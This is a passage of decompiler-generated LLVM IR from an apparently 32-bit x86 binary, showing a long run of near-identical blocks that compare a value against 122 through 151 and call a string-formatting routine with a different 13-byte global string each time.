  %v12_804b4fe = icmp eq i32 %v11_8049e19, 122
  %v1_804b502 = icmp eq i1 %v12_804b4fe, false
  br i1 %v1_804b502, label %dec_label_pc_804b52e, label %dec_label_pc_804b504

dec_label_pc_804b504:                             ; preds = %dec_label_pc_804b4fe
  %v0_804b504 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b504 = zext i8 %v0_804b504 to i32
  store i32 %v1_804b504, i32* @edx, align 4
  %v0_804b510 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b510 = zext i8 %v0_804b510 to i32
  %v2_804b51f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b51f, i32* @ebx, align 4
  %v5_804b526 = call i32 @function_8048b5b(i32 %v2_804b51f, i32 ptrtoint ([13 x i8]* @global_var_805a54f.165 to i32), i32 %v1_804b510, i32 %v1_804b504)
  br label %dec_label_pc_804b52e

dec_label_pc_804b52e:                             ; preds = %dec_label_pc_804b4fe, %dec_label_pc_804b504
  %v12_804b52e = icmp eq i32 %v11_8049e19, 123
  %v1_804b532 = icmp eq i1 %v12_804b52e, false
  br i1 %v1_804b532, label %dec_label_pc_804b55e, label %dec_label_pc_804b534

dec_label_pc_804b534:                             ; preds = %dec_label_pc_804b52e
  %v0_804b534 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b534 = zext i8 %v0_804b534 to i32
  store i32 %v1_804b534, i32* @edx, align 4
  %v0_804b540 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b540 = zext i8 %v0_804b540 to i32
  %v2_804b54f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b54f, i32* @ebx, align 4
  %v5_804b556 = call i32 @function_8048b5b(i32 %v2_804b54f, i32 ptrtoint ([13 x i8]* @global_var_805a55c.166 to i32), i32 %v1_804b540, i32 %v1_804b534)
  br label %dec_label_pc_804b55e

dec_label_pc_804b55e:                             ; preds = %dec_label_pc_804b52e, %dec_label_pc_804b534
  %v12_804b55e = icmp eq i32 %v11_8049e19, 124
  %v1_804b562 = icmp eq i1 %v12_804b55e, false
  br i1 %v1_804b562, label %dec_label_pc_804b58e, label %dec_label_pc_804b564

dec_label_pc_804b564:                             ; preds = %dec_label_pc_804b55e
  %v0_804b564 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b564 = zext i8 %v0_804b564 to i32
  store i32 %v1_804b564, i32* @edx, align 4
  %v0_804b570 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b570 = zext i8 %v0_804b570 to i32
  %v2_804b57f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b57f, i32* @ebx, align 4
  %v5_804b586 = call i32 @function_8048b5b(i32 %v2_804b57f, i32 ptrtoint ([13 x i8]* @global_var_805a569.167 to i32), i32 %v1_804b570, i32 %v1_804b564)
  br label %dec_label_pc_804b58e

dec_label_pc_804b58e:                             ; preds = %dec_label_pc_804b55e, %dec_label_pc_804b564
  %v12_804b58e = icmp eq i32 %v11_8049e19, 125
  %v1_804b592 = icmp eq i1 %v12_804b58e, false
  br i1 %v1_804b592, label %dec_label_pc_804b5be, label %dec_label_pc_804b594

dec_label_pc_804b594:                             ; preds = %dec_label_pc_804b58e
  %v0_804b594 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b594 = zext i8 %v0_804b594 to i32
  store i32 %v1_804b594, i32* @edx, align 4
  %v0_804b5a0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b5a0 = zext i8 %v0_804b5a0 to i32
  %v2_804b5af = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5af, i32* @ebx, align 4
  %v5_804b5b6 = call i32 @function_8048b5b(i32 %v2_804b5af, i32 ptrtoint ([13 x i8]* @global_var_805a576.168 to i32), i32 %v1_804b5a0, i32 %v1_804b594)
  br label %dec_label_pc_804b5be

dec_label_pc_804b5be:                             ; preds = %dec_label_pc_804b58e, %dec_label_pc_804b594
  %v12_804b5be = icmp eq i32 %v11_8049e19, 126
  %v1_804b5c2 = icmp eq i1 %v12_804b5be, false
  br i1 %v1_804b5c2, label %dec_label_pc_804b5ee, label %dec_label_pc_804b5c4

dec_label_pc_804b5c4:                             ; preds = %dec_label_pc_804b5be
  %v0_804b5c4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b5c4 = zext i8 %v0_804b5c4 to i32
  store i32 %v1_804b5c4, i32* @edx, align 4
  %v0_804b5d0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b5d0 = zext i8 %v0_804b5d0 to i32
  %v2_804b5df = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5df, i32* @ebx, align 4
  %v5_804b5e6 = call i32 @function_8048b5b(i32 %v2_804b5df, i32 ptrtoint ([13 x i8]* @global_var_805a583.169 to i32), i32 %v1_804b5d0, i32 %v1_804b5c4)
  br label %dec_label_pc_804b5ee

dec_label_pc_804b5ee:                             ; preds = %dec_label_pc_804b5be, %dec_label_pc_804b5c4
  %v12_804b5ee = icmp eq i32 %v11_8049e19, 127
  %v1_804b5f2 = icmp eq i1 %v12_804b5ee, false
  br i1 %v1_804b5f2, label %dec_label_pc_804b61e, label %dec_label_pc_804b5f4

dec_label_pc_804b5f4:                             ; preds = %dec_label_pc_804b5ee
  %v0_804b5f4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b5f4 = zext i8 %v0_804b5f4 to i32
  store i32 %v1_804b5f4, i32* @edx, align 4
  %v0_804b600 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b600 = zext i8 %v0_804b600 to i32
  %v2_804b60f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b60f, i32* @ebx, align 4
  %v5_804b616 = call i32 @function_8048b5b(i32 %v2_804b60f, i32 ptrtoint ([13 x i8]* @global_var_805a590.170 to i32), i32 %v1_804b600, i32 %v1_804b5f4)
  br label %dec_label_pc_804b61e

dec_label_pc_804b61e:                             ; preds = %dec_label_pc_804b5ee, %dec_label_pc_804b5f4
  %v9_804b61e = icmp eq i32 %v11_8049e19, 128
  %v1_804b625 = icmp eq i1 %v9_804b61e, false
  br i1 %v1_804b625, label %dec_label_pc_804b651, label %dec_label_pc_804b627

dec_label_pc_804b627:                             ; preds = %dec_label_pc_804b61e
  %v0_804b627 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b627 = zext i8 %v0_804b627 to i32
  store i32 %v1_804b627, i32* @edx, align 4
  %v0_804b633 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b633 = zext i8 %v0_804b633 to i32
  %v2_804b642 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b642, i32* @ebx, align 4
  %v5_804b649 = call i32 @function_8048b5b(i32 %v2_804b642, i32 ptrtoint ([13 x i8]* @global_var_805a59d.171 to i32), i32 %v1_804b633, i32 %v1_804b627)
  br label %dec_label_pc_804b651

dec_label_pc_804b651:                             ; preds = %dec_label_pc_804b61e, %dec_label_pc_804b627
  %v12_804b651 = icmp eq i32 %v11_8049e19, 129
  %v1_804b658 = icmp eq i1 %v12_804b651, false
  br i1 %v1_804b658, label %dec_label_pc_804b684, label %dec_label_pc_804b65a

dec_label_pc_804b65a:                             ; preds = %dec_label_pc_804b651
  %v0_804b65a = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b65a = zext i8 %v0_804b65a to i32
  store i32 %v1_804b65a, i32* @edx, align 4
  %v0_804b666 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b666 = zext i8 %v0_804b666 to i32
  %v2_804b675 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b675, i32* @ebx, align 4
  %v5_804b67c = call i32 @function_8048b5b(i32 %v2_804b675, i32 ptrtoint ([13 x i8]* @global_var_805a5aa.172 to i32), i32 %v1_804b666, i32 %v1_804b65a)
  br label %dec_label_pc_804b684

dec_label_pc_804b684:                             ; preds = %dec_label_pc_804b651, %dec_label_pc_804b65a
  %v12_804b684 = icmp eq i32 %v11_8049e19, 130
  %v1_804b68b = icmp eq i1 %v12_804b684, false
  br i1 %v1_804b68b, label %dec_label_pc_804b6b7, label %dec_label_pc_804b68d

dec_label_pc_804b68d:                             ; preds = %dec_label_pc_804b684
  %v0_804b68d = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b68d = zext i8 %v0_804b68d to i32
  store i32 %v1_804b68d, i32* @edx, align 4
  %v0_804b699 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b699 = zext i8 %v0_804b699 to i32
  %v2_804b6a8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6a8, i32* @ebx, align 4
  %v5_804b6af = call i32 @function_8048b5b(i32 %v2_804b6a8, i32 ptrtoint ([13 x i8]* @global_var_805a5b7.173 to i32), i32 %v1_804b699, i32 %v1_804b68d)
  br label %dec_label_pc_804b6b7

dec_label_pc_804b6b7:                             ; preds = %dec_label_pc_804b684, %dec_label_pc_804b68d
  %v12_804b6b7 = icmp eq i32 %v11_8049e19, 131
  %v1_804b6be = icmp eq i1 %v12_804b6b7, false
  br i1 %v1_804b6be, label %dec_label_pc_804b6ea, label %dec_label_pc_804b6c0

dec_label_pc_804b6c0:                             ; preds = %dec_label_pc_804b6b7
  %v0_804b6c0 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b6c0 = zext i8 %v0_804b6c0 to i32
  store i32 %v1_804b6c0, i32* @edx, align 4
  %v0_804b6cc = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b6cc = zext i8 %v0_804b6cc to i32
  %v2_804b6db = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6db, i32* @ebx, align 4
  %v5_804b6e2 = call i32 @function_8048b5b(i32 %v2_804b6db, i32 ptrtoint ([13 x i8]* @global_var_805a5c4.174 to i32), i32 %v1_804b6cc, i32 %v1_804b6c0)
  br label %dec_label_pc_804b6ea

dec_label_pc_804b6ea:                             ; preds = %dec_label_pc_804b6b7, %dec_label_pc_804b6c0
  %v12_804b6ea = icmp eq i32 %v11_8049e19, 132
  %v1_804b6f1 = icmp eq i1 %v12_804b6ea, false
  br i1 %v1_804b6f1, label %dec_label_pc_804b71d, label %dec_label_pc_804b6f3

dec_label_pc_804b6f3:                             ; preds = %dec_label_pc_804b6ea
  %v0_804b6f3 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b6f3 = zext i8 %v0_804b6f3 to i32
  store i32 %v1_804b6f3, i32* @edx, align 4
  %v0_804b6ff = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b6ff = zext i8 %v0_804b6ff to i32
  %v2_804b70e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b70e, i32* @ebx, align 4
  %v5_804b715 = call i32 @function_8048b5b(i32 %v2_804b70e, i32 ptrtoint ([13 x i8]* @global_var_805a5d1.175 to i32), i32 %v1_804b6ff, i32 %v1_804b6f3)
  br label %dec_label_pc_804b71d

dec_label_pc_804b71d:                             ; preds = %dec_label_pc_804b6ea, %dec_label_pc_804b6f3
  %v12_804b71d = icmp eq i32 %v11_8049e19, 133
  %v1_804b724 = icmp eq i1 %v12_804b71d, false
  br i1 %v1_804b724, label %dec_label_pc_804b750, label %dec_label_pc_804b726

dec_label_pc_804b726:                             ; preds = %dec_label_pc_804b71d
  %v0_804b726 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b726 = zext i8 %v0_804b726 to i32
  store i32 %v1_804b726, i32* @edx, align 4
  %v0_804b732 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b732 = zext i8 %v0_804b732 to i32
  %v2_804b741 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b741, i32* @ebx, align 4
  %v5_804b748 = call i32 @function_8048b5b(i32 %v2_804b741, i32 ptrtoint ([13 x i8]* @global_var_805a5de.176 to i32), i32 %v1_804b732, i32 %v1_804b726)
  br label %dec_label_pc_804b750

dec_label_pc_804b750:                             ; preds = %dec_label_pc_804b71d, %dec_label_pc_804b726
  %v12_804b750 = icmp eq i32 %v11_8049e19, 134
  %v1_804b757 = icmp eq i1 %v12_804b750, false
  br i1 %v1_804b757, label %dec_label_pc_804b783, label %dec_label_pc_804b759

dec_label_pc_804b759:                             ; preds = %dec_label_pc_804b750
  %v0_804b759 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b759 = zext i8 %v0_804b759 to i32
  store i32 %v1_804b759, i32* @edx, align 4
  %v0_804b765 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b765 = zext i8 %v0_804b765 to i32
  %v2_804b774 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b774, i32* @ebx, align 4
  %v5_804b77b = call i32 @function_8048b5b(i32 %v2_804b774, i32 ptrtoint ([13 x i8]* @global_var_805a5eb.177 to i32), i32 %v1_804b765, i32 %v1_804b759)
  br label %dec_label_pc_804b783

dec_label_pc_804b783:                             ; preds = %dec_label_pc_804b750, %dec_label_pc_804b759
  %v12_804b783 = icmp eq i32 %v11_8049e19, 135
  %v1_804b78a = icmp eq i1 %v12_804b783, false
  br i1 %v1_804b78a, label %dec_label_pc_804b7b6, label %dec_label_pc_804b78c

dec_label_pc_804b78c:                             ; preds = %dec_label_pc_804b783
  %v0_804b78c = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b78c = zext i8 %v0_804b78c to i32
  store i32 %v1_804b78c, i32* @edx, align 4
  %v0_804b798 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b798 = zext i8 %v0_804b798 to i32
  %v2_804b7a7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7a7, i32* @ebx, align 4
  %v5_804b7ae = call i32 @function_8048b5b(i32 %v2_804b7a7, i32 ptrtoint ([13 x i8]* @global_var_805a5f8.178 to i32), i32 %v1_804b798, i32 %v1_804b78c)
  br label %dec_label_pc_804b7b6

dec_label_pc_804b7b6:                             ; preds = %dec_label_pc_804b783, %dec_label_pc_804b78c
  %v12_804b7b6 = icmp eq i32 %v11_8049e19, 136
  %v1_804b7bd = icmp eq i1 %v12_804b7b6, false
  br i1 %v1_804b7bd, label %dec_label_pc_804b7e9, label %dec_label_pc_804b7bf

dec_label_pc_804b7bf:                             ; preds = %dec_label_pc_804b7b6
  %v0_804b7bf = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b7bf = zext i8 %v0_804b7bf to i32
  store i32 %v1_804b7bf, i32* @edx, align 4
  %v0_804b7cb = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b7cb = zext i8 %v0_804b7cb to i32
  %v2_804b7da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7da, i32* @ebx, align 4
  %v5_804b7e1 = call i32 @function_8048b5b(i32 %v2_804b7da, i32 ptrtoint ([13 x i8]* @global_var_805a605.179 to i32), i32 %v1_804b7cb, i32 %v1_804b7bf)
  br label %dec_label_pc_804b7e9

dec_label_pc_804b7e9:                             ; preds = %dec_label_pc_804b7b6, %dec_label_pc_804b7bf
  %v12_804b7e9 = icmp eq i32 %v11_8049e19, 137
  %v1_804b7f0 = icmp eq i1 %v12_804b7e9, false
  br i1 %v1_804b7f0, label %dec_label_pc_804b81c, label %dec_label_pc_804b7f2

dec_label_pc_804b7f2:                             ; preds = %dec_label_pc_804b7e9
  %v0_804b7f2 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b7f2 = zext i8 %v0_804b7f2 to i32
  store i32 %v1_804b7f2, i32* @edx, align 4
  %v0_804b7fe = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b7fe = zext i8 %v0_804b7fe to i32
  %v2_804b80d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b80d, i32* @ebx, align 4
  %v5_804b814 = call i32 @function_8048b5b(i32 %v2_804b80d, i32 ptrtoint ([13 x i8]* @global_var_805a612.180 to i32), i32 %v1_804b7fe, i32 %v1_804b7f2)
  br label %dec_label_pc_804b81c

dec_label_pc_804b81c:                             ; preds = %dec_label_pc_804b7e9, %dec_label_pc_804b7f2
  %v12_804b81c = icmp eq i32 %v11_8049e19, 138
  %v1_804b823 = icmp eq i1 %v12_804b81c, false
  br i1 %v1_804b823, label %dec_label_pc_804b84f, label %dec_label_pc_804b825

dec_label_pc_804b825:                             ; preds = %dec_label_pc_804b81c
  %v0_804b825 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b825 = zext i8 %v0_804b825 to i32
  store i32 %v1_804b825, i32* @edx, align 4
  %v0_804b831 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b831 = zext i8 %v0_804b831 to i32
  %v2_804b840 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b840, i32* @ebx, align 4
  %v5_804b847 = call i32 @function_8048b5b(i32 %v2_804b840, i32 ptrtoint ([13 x i8]* @global_var_805a61f.181 to i32), i32 %v1_804b831, i32 %v1_804b825)
  br label %dec_label_pc_804b84f

dec_label_pc_804b84f:                             ; preds = %dec_label_pc_804b81c, %dec_label_pc_804b825
  %v12_804b84f = icmp eq i32 %v11_8049e19, 139
  %v1_804b856 = icmp eq i1 %v12_804b84f, false
  br i1 %v1_804b856, label %dec_label_pc_804b882, label %dec_label_pc_804b858

dec_label_pc_804b858:                             ; preds = %dec_label_pc_804b84f
  %v0_804b858 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b858 = zext i8 %v0_804b858 to i32
  store i32 %v1_804b858, i32* @edx, align 4
  %v0_804b864 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b864 = zext i8 %v0_804b864 to i32
  %v2_804b873 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b873, i32* @ebx, align 4
  %v5_804b87a = call i32 @function_8048b5b(i32 %v2_804b873, i32 ptrtoint ([13 x i8]* @global_var_805a62c.182 to i32), i32 %v1_804b864, i32 %v1_804b858)
  br label %dec_label_pc_804b882

dec_label_pc_804b882:                             ; preds = %dec_label_pc_804b84f, %dec_label_pc_804b858
  %v12_804b882 = icmp eq i32 %v11_8049e19, 140
  %v1_804b889 = icmp eq i1 %v12_804b882, false
  br i1 %v1_804b889, label %dec_label_pc_804b8b5, label %dec_label_pc_804b88b

dec_label_pc_804b88b:                             ; preds = %dec_label_pc_804b882
  %v0_804b88b = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b88b = zext i8 %v0_804b88b to i32
  store i32 %v1_804b88b, i32* @edx, align 4
  %v0_804b897 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b897 = zext i8 %v0_804b897 to i32
  %v2_804b8a6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8a6, i32* @ebx, align 4
  %v5_804b8ad = call i32 @function_8048b5b(i32 %v2_804b8a6, i32 ptrtoint ([13 x i8]* @global_var_805a639.183 to i32), i32 %v1_804b897, i32 %v1_804b88b)
  br label %dec_label_pc_804b8b5

dec_label_pc_804b8b5:                             ; preds = %dec_label_pc_804b882, %dec_label_pc_804b88b
  %v12_804b8b5 = icmp eq i32 %v11_8049e19, 141
  %v1_804b8bc = icmp eq i1 %v12_804b8b5, false
  br i1 %v1_804b8bc, label %dec_label_pc_804b8e8, label %dec_label_pc_804b8be

dec_label_pc_804b8be:                             ; preds = %dec_label_pc_804b8b5
  %v0_804b8be = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b8be = zext i8 %v0_804b8be to i32
  store i32 %v1_804b8be, i32* @edx, align 4
  %v0_804b8ca = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b8ca = zext i8 %v0_804b8ca to i32
  %v2_804b8d9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8d9, i32* @ebx, align 4
  %v5_804b8e0 = call i32 @function_8048b5b(i32 %v2_804b8d9, i32 ptrtoint ([13 x i8]* @global_var_805a646.184 to i32), i32 %v1_804b8ca, i32 %v1_804b8be)
  br label %dec_label_pc_804b8e8

dec_label_pc_804b8e8:                             ; preds = %dec_label_pc_804b8b5, %dec_label_pc_804b8be
  %v12_804b8e8 = icmp eq i32 %v11_8049e19, 142
  %v1_804b8ef = icmp eq i1 %v12_804b8e8, false
  br i1 %v1_804b8ef, label %dec_label_pc_804b91b, label %dec_label_pc_804b8f1

dec_label_pc_804b8f1:                             ; preds = %dec_label_pc_804b8e8
  %v0_804b8f1 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b8f1 = zext i8 %v0_804b8f1 to i32
  store i32 %v1_804b8f1, i32* @edx, align 4
  %v0_804b8fd = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b8fd = zext i8 %v0_804b8fd to i32
  %v2_804b90c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b90c, i32* @ebx, align 4
  %v5_804b913 = call i32 @function_8048b5b(i32 %v2_804b90c, i32 ptrtoint ([13 x i8]* @global_var_805a653.185 to i32), i32 %v1_804b8fd, i32 %v1_804b8f1)
  br label %dec_label_pc_804b91b

dec_label_pc_804b91b:                             ; preds = %dec_label_pc_804b8e8, %dec_label_pc_804b8f1
  %v12_804b91b = icmp eq i32 %v11_8049e19, 143
  %v1_804b922 = icmp eq i1 %v12_804b91b, false
  br i1 %v1_804b922, label %dec_label_pc_804b94e, label %dec_label_pc_804b924

dec_label_pc_804b924:                             ; preds = %dec_label_pc_804b91b
  %v0_804b924 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b924 = zext i8 %v0_804b924 to i32
  store i32 %v1_804b924, i32* @edx, align 4
  %v0_804b930 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b930 = zext i8 %v0_804b930 to i32
  %v2_804b93f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b93f, i32* @ebx, align 4
  %v5_804b946 = call i32 @function_8048b5b(i32 %v2_804b93f, i32 ptrtoint ([13 x i8]* @global_var_805a660.186 to i32), i32 %v1_804b930, i32 %v1_804b924)
  br label %dec_label_pc_804b94e

dec_label_pc_804b94e:                             ; preds = %dec_label_pc_804b91b, %dec_label_pc_804b924
  %v9_804b94e = icmp eq i32 %v11_8049e19, 144
  %v1_804b955 = icmp eq i1 %v9_804b94e, false
  br i1 %v1_804b955, label %dec_label_pc_804b981, label %dec_label_pc_804b957

dec_label_pc_804b957:                             ; preds = %dec_label_pc_804b94e
  %v0_804b957 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b957 = zext i8 %v0_804b957 to i32
  store i32 %v1_804b957, i32* @edx, align 4
  %v0_804b963 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b963 = zext i8 %v0_804b963 to i32
  %v2_804b972 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b972, i32* @ebx, align 4
  %v5_804b979 = call i32 @function_8048b5b(i32 %v2_804b972, i32 ptrtoint ([13 x i8]* @global_var_805a66d.187 to i32), i32 %v1_804b963, i32 %v1_804b957)
  br label %dec_label_pc_804b981

dec_label_pc_804b981:                             ; preds = %dec_label_pc_804b94e, %dec_label_pc_804b957
  %v12_804b981 = icmp eq i32 %v11_8049e19, 145
  %v1_804b988 = icmp eq i1 %v12_804b981, false
  br i1 %v1_804b988, label %dec_label_pc_804b9b4, label %dec_label_pc_804b98a

dec_label_pc_804b98a:                             ; preds = %dec_label_pc_804b981
  %v0_804b98a = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b98a = zext i8 %v0_804b98a to i32
  store i32 %v1_804b98a, i32* @edx, align 4
  %v0_804b996 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b996 = zext i8 %v0_804b996 to i32
  %v2_804b9a5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9a5, i32* @ebx, align 4
  %v5_804b9ac = call i32 @function_8048b5b(i32 %v2_804b9a5, i32 ptrtoint ([13 x i8]* @global_var_805a67a.188 to i32), i32 %v1_804b996, i32 %v1_804b98a)
  br label %dec_label_pc_804b9b4

dec_label_pc_804b9b4:                             ; preds = %dec_label_pc_804b981, %dec_label_pc_804b98a
  %v12_804b9b4 = icmp eq i32 %v11_8049e19, 146
  %v1_804b9bb = icmp eq i1 %v12_804b9b4, false
  br i1 %v1_804b9bb, label %dec_label_pc_804b9e7, label %dec_label_pc_804b9bd

dec_label_pc_804b9bd:                             ; preds = %dec_label_pc_804b9b4
  %v0_804b9bd = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b9bd = zext i8 %v0_804b9bd to i32
  store i32 %v1_804b9bd, i32* @edx, align 4
  %v0_804b9c9 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b9c9 = zext i8 %v0_804b9c9 to i32
  %v2_804b9d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9d8, i32* @ebx, align 4
  %v5_804b9df = call i32 @function_8048b5b(i32 %v2_804b9d8, i32 ptrtoint ([13 x i8]* @global_var_805a687.189 to i32), i32 %v1_804b9c9, i32 %v1_804b9bd)
  br label %dec_label_pc_804b9e7

dec_label_pc_804b9e7:                             ; preds = %dec_label_pc_804b9b4, %dec_label_pc_804b9bd
  %v12_804b9e7 = icmp eq i32 %v11_8049e19, 147
  %v1_804b9ee = icmp eq i1 %v12_804b9e7, false
  br i1 %v1_804b9ee, label %dec_label_pc_804ba1a, label %dec_label_pc_804b9f0

dec_label_pc_804b9f0:                             ; preds = %dec_label_pc_804b9e7
  %v0_804b9f0 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804b9f0 = zext i8 %v0_804b9f0 to i32
  store i32 %v1_804b9f0, i32* @edx, align 4
  %v0_804b9fc = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804b9fc = zext i8 %v0_804b9fc to i32
  %v2_804ba0b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba0b, i32* @ebx, align 4
  %v5_804ba12 = call i32 @function_8048b5b(i32 %v2_804ba0b, i32 ptrtoint ([13 x i8]* @global_var_805a694.190 to i32), i32 %v1_804b9fc, i32 %v1_804b9f0)
  br label %dec_label_pc_804ba1a

dec_label_pc_804ba1a:                             ; preds = %dec_label_pc_804b9e7, %dec_label_pc_804b9f0
  %v12_804ba1a = icmp eq i32 %v11_8049e19, 148
  %v1_804ba21 = icmp eq i1 %v12_804ba1a, false
  br i1 %v1_804ba21, label %dec_label_pc_804ba4d, label %dec_label_pc_804ba23

dec_label_pc_804ba23:                             ; preds = %dec_label_pc_804ba1a
  %v0_804ba23 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ba23 = zext i8 %v0_804ba23 to i32
  store i32 %v1_804ba23, i32* @edx, align 4
  %v0_804ba2f = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ba2f = zext i8 %v0_804ba2f to i32
  %v2_804ba3e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba3e, i32* @ebx, align 4
  %v5_804ba45 = call i32 @function_8048b5b(i32 %v2_804ba3e, i32 ptrtoint ([13 x i8]* @global_var_805a6a1.191 to i32), i32 %v1_804ba2f, i32 %v1_804ba23)
  br label %dec_label_pc_804ba4d

dec_label_pc_804ba4d:                             ; preds = %dec_label_pc_804ba1a, %dec_label_pc_804ba23
  %v12_804ba4d = icmp eq i32 %v11_8049e19, 149
  %v1_804ba54 = icmp eq i1 %v12_804ba4d, false
  br i1 %v1_804ba54, label %dec_label_pc_804ba80, label %dec_label_pc_804ba56

dec_label_pc_804ba56:                             ; preds = %dec_label_pc_804ba4d
  %v0_804ba56 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ba56 = zext i8 %v0_804ba56 to i32
  store i32 %v1_804ba56, i32* @edx, align 4
  %v0_804ba62 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ba62 = zext i8 %v0_804ba62 to i32
  %v2_804ba71 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba71, i32* @ebx, align 4
  %v5_804ba78 = call i32 @function_8048b5b(i32 %v2_804ba71, i32 ptrtoint ([13 x i8]* @global_var_805a6ae.192 to i32), i32 %v1_804ba62, i32 %v1_804ba56)
  br label %dec_label_pc_804ba80

dec_label_pc_804ba80:                             ; preds = %dec_label_pc_804ba4d, %dec_label_pc_804ba56
  %v12_804ba80 = icmp eq i32 %v11_8049e19, 150
  %v1_804ba87 = icmp eq i1 %v12_804ba80, false
  br i1 %v1_804ba87, label %dec_label_pc_804bab3, label %dec_label_pc_804ba89

dec_label_pc_804ba89:                             ; preds = %dec_label_pc_804ba80
  %v0_804ba89 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ba89 = zext i8 %v0_804ba89 to i32
  store i32 %v1_804ba89, i32* @edx, align 4
  %v0_804ba95 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ba95 = zext i8 %v0_804ba95 to i32
  %v2_804baa4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804baa4, i32* @ebx, align 4
  %v5_804baab = call i32 @function_8048b5b(i32 %v2_804baa4, i32 ptrtoint ([13 x i8]* @global_var_805a6bb.193 to i32), i32 %v1_804ba95, i32 %v1_804ba89)
  br label %dec_label_pc_804bab3

dec_label_pc_804bab3:                             ; preds = %dec_label_pc_804ba80, %dec_label_pc_804ba89
  %v12_804bab3 = icmp eq i32 %v11_8049e19, 151
  %v1_804baba = icmp eq i1 %v12_804bab3, false
  br i1 %v1_804baba, label %dec_label_pc_804bae6, label %dec_label_pc_804babc

dec_label_pc_804babc:                             ; preds = %dec_label_pc_804bab3
  %v0_804babc = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804babc = zext i8 %v0_804babc to i32
  store i32 %v1_804babc, i32* @edx, align 4
  %v0_804bac8 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804bac8 = zext i8 %v0_804bac8 to i32
  %v2_804bad7 = ptrtoint i32* %stack_var_-28 to i32
